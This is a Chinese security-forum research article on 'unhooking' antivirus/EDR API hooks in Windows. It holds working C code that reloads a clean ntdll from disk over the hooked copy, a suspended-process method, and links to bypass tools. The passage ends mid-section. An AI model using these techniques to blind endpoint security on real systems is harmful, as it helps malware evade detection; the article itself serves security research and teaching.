---
title: 杀毒软件脱钩（Unhoo）技术研究与实践
url: https://forum.butian.net/share/4107
source: 奇安信攻防社区
date: 2025-02-09
fetch_date: 2025-10-06T20:33:44.741099
---

# 杀毒软件脱钩（Unhoo）技术研究与实践

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 杀毒软件脱钩（Unhoo）技术研究与实践

* [渗透测试](https://forum.butian.net/topic/47)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。（本文仅用于交流学习），本文仅作技术研究。

前言
--
API Hook是通过替换操作系统中的 API 函数来拦截对这些函数的调用。在 Windows操作系统中，许多关键函数（如 CreateFile、ReadFile、LoadLibrary等）是通过DLL导出实现的，而这些DLL又被操作系统加载到进程的地址空间中。
为了拦截这些 API 调用，EDR会修改目标DLL中的函数入口并且将EDR的DLL注入到进程中。常见的方法是将函数的开头几个字节修改为跳转指令（JMP），使得程序执行跳转到 EDR 提供的检测函数中。通过这种方式，EDR就能在目标Windows API被调用之前执行一些额外的检查，比如日志记录、恶意行为检测等。
这里通过Bit\\*\\*\\*\\*der可以看见其将两个DLL注入到了当前进程中
![1.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-d62e604f278e78da27df49a2eeddd54007ff9b1e.png)
![2.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-9b0d726aab461b7115ca760af0da54d2e5e023e8.png)
这里将另外一个测试程序加入到白名单中，再次附加查看，发现并没有DLL注入
![4.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-cbd136c2de2a097dbbf242f8d722ac5dc43ea432.png)
![3.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-dc33bf56e8e4363bd27c44dd796f1f8a9259b795.png)
那么有什么区别呢，这里选OpenThread进行比较，这里可以看见Bit\\*\\*\\*\\*der对于三环函数是有挂钩的（左：加了白名单，右：未加白名单）
![5.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-507c3b6ce1aa4e0ef902916b032e51a914aeee02.png)
Bit\\*\\*\\*\\*der不仅对3环部分函数进行了Hook，对于0环部分函数也有hook（左：加了白名单，右：未加白名单）
![6.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-267ccef78bdf0bab5d8e7609d8ad019604a2223a.png)
那么如果不让Bit\\*\\*\\*\\*der注入到进程，是否就能脱钩呢？
禁止非签DLL注入
---------
### SetProcessMitigationPolicy
Windows官方提供了相关的函数与方法实现，禁止非Microsoft、Windows应用商店或Windows 硬件签名的程序注入到进程，具体函数参考如下链接：
<https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy>
这里实现了个简单的demo
```php
#include
int main()
{
PROCESS\_MITIGATION\_BINARY\_SIGNATURE\_POLICY pmbsp = { 0 };
pmbsp.StoreSignedOnly = false;
pmbsp.MicrosoftSignedOnly = true;
BOOL result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;pmbsp, sizeof(pmbsp));
if (!result) {
MessageBox(NULL, "False", "False", MB\_OK);
}
MessageBox(NULL, "Success", "Success", MB\_OK);
return 0;
}
```
程序多了Signatures restricted (Microsoft only)，代表生效了
![7.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-da2f686e3687590d09b4bd7f884a7b02a87f2baa.png)
但是查看Modules中还是发现被Bit\\*\\*\\*\\*der注入了DLL
![8.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-995b1e2f51c790e73fc95322f8b9539aaefb174d.png)
查看这两个DLL发现，被加了微软的签名，那么这个demo可以说无效了
![9.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-5d552b4c1ce50c0a16112535e8cdd189c623de7d.png)
那么是否能绕过EDR的函数Hook策略呢？
脱钩
--
### 系统调用
比如3环VirtualAlloc函数，最终调用的0环函数是NtAllocateVirtualMemory，查看NtAllocateVirtualMemory函数，可以看见最后使用syscall调用系统调用
![31.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-a4e307659b421645f311f86800b7142f8ece932b.png)
但是程序的堆栈是不正常的，因为正常的程序0环执行结束返回3环的时候，这个返回地址应该是在ntdll所在地址范围之内。
### 磁盘重载ntdll
从磁盘加载一个干净的DLL文件，将其映射到内存中，并用磁盘中原始 .text 节的内容替换当前内存中已被挂钩的DLL的 .text节，来达到脱钩的目的。
简单的demo
```php
void UnHookDll(LPCSTR dllname) {
MODULEINFO mi = {};
HMODULE ntdllModule = GetModuleHandleA(dllname);
GetModuleInformation(HANDLE(-1), ntdllModule, &amp;mi, sizeof(mi));
char dllpath[MAX\_PATH] = { 0 };
LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
sprintf\_s(dllpath, "c:\\windows\\system32\\%s", dllname);
HANDLE ntdllFile = CreateFileA((LPCSTR)dllpath, GENERIC\_READ, FILE\_SHARE\_READ, NULL, OPEN\_EXISTING, 0, NULL);
HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE\_READONLY | SEC\_IMAGE, 0, 0, NULL);
LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE\_MAP\_READ, 0, 0, 0);
PIMAGE\_DOS\_HEADER hookedDosHeader = (PIMAGE\_DOS\_HEADER)ntdllBase;
PIMAGE\_NT\_HEADERS hookedNtHeader = (PIMAGE\_NT\_HEADERS)((DWORD\_PTR)ntdllBase + hookedDosHeader-&gt;e\_lfanew);
for (WORD i = 0; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) {
PIMAGE\_SECTION\_HEADER hookedSectionHeader = (PIMAGE\_SECTION\_HEADER)((DWORD\_PTR)IMAGE\_FIRST\_SECTION(hookedNtHeader) + ((DWORD\_PTR)IMAGE\_SIZEOF\_SECTION\_HEADER \* i));
if (!strcmp((char\*)hookedSectionHeader-&gt;Name, (char\*)".text")) {
DWORD oldProtection = 0;
SIZE\_T virtualSize = hookedSectionHeader-&gt;Misc.VirtualSize;
VirtualProtect((LPVOID)((DWORD\_PTR)ntdllBase + (DWORD\_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE\_EXECUTE\_READWRITE, &amp;oldProtection);
memcpy((LPVOID)((DWORD\_PTR)ntdllBase + (DWORD\_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD\_PTR)ntdllMappingAddress + (DWORD\_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);
VirtualProtect((LPVOID)((DWORD\_PTR)ntdllBase + (DWORD\_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);
}
}
CloseHandle(ntdllFile);
CloseHandle(ntdllMapping);
FreeLibrary(ntdllModule);
}
```
运行代码，发现三环函数已经脱钩了
![10.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-32cd55467b32299c5b979a1fc2d2ed1b23362dde.png)
内核函数也已经脱钩
![11.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-b64f3c08daa25f8f1d02c27e4a965eee98322e67.png)
### 挂起进程获得干净ntdll
先来创建一个被挂起的进程，简单的demo
```php
#include
int main()
{
STARTUPINFOA si = { 0 };
PROCESS\_INFORMATION pi = { 0 };
si.cb = sizeof(STARTUPINFOA);
BOOL result = CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE\_SUSPENDED | CREATE\_NEW\_CONSOLE, NULL, NULL, &amp;si, &amp;pi);
if (!result) {
MessageBox(NULL, "False", "False", MB\_OK);
}
MessageBox(NULL, "Success CREATE\_SUSPENDED", "Success CREATE\_SUSPENDED", MB\_OK);
return 0;
}
```
可以看到被挂起的进程中只有ntdll.dll，并没有其余的DLL，包括Bit\\*\\*\\*\\*der杀软的DLL（左：被挂起的进程，右：未被挂起的进程）
![12.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-8285ddaafee942b0922e49452aeb327c60f20a0c.png)
并且可以看见NtWriteVirtualMemory函数并没有被挂钩
![13.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-3a0969fb155c58acb44950f0ece606beafb81064.png)
而且在同个操作系统上，不同程序加载的ntdll的基址都是相同的
![14.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-9886fb13d680e36fc86987d6c0e48bf3ebf7ed8a.png)
因此可以确定，新起的被挂起的进程他的ntdll是没有被挂钩的，但是缺点很明显，只有Ntdll，对于kernel32.dll、KernelBase.dll还是不能脱钩，demo代码已经有外国友人实现了：<https://github.com/dosxuz/PerunsFart>
可以看见内核函数已经脱钩
![15.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-cc583b5274f5057033661073c5e714ebce2f6ad1.png)
### 自定义跳转函数unhook
一些EDR去Hook的方式就是去修改Windows DLL中的函数，通过在函数开头插入JMP指令来跳转到自己的检测函数
![16.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-b8276e1ca43b30be2f491640b996fe677b9b16ed.png)
这种unhook方式就是自己去组装一个跳转函数，来进行EDR的规避。参考代码：<https://github.com/trickster0/LdrLoadDll-Unhooking>
先来简单看看代码的大体功能，然后再调试看看
定义与初始化，指定要加载的DLL，获取LdrLoadDll函数的地址
![17.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-3ef8e32e77fb978a2f9c04eacc500eb8282af91a.png)
![23.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-06c634c084fbde583a3711ace518983c84aaa7c1.png)
定义跳转指令的结构
- jumpPrelude\[\] = { 0x49, 0xBB }：64 位的 mov指令
- jumpAddress\[\] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF }：占位符，后续会替换为实际的跳转地址
- jumpEpilogue\[\] = { 0x41, 0xFF, 0xE3, 0xC3 }：跳转指令和函数返回指令
之后就是将LdrLoadDll地址5个字节后的地址放入到jmpAddr中（之所以是5个字节后，是避免将EDR的hook函数的jmp指令一同放入到jmpAddr中），然后将jmpAddr的地址放入到 jumpAddress中
![18.p...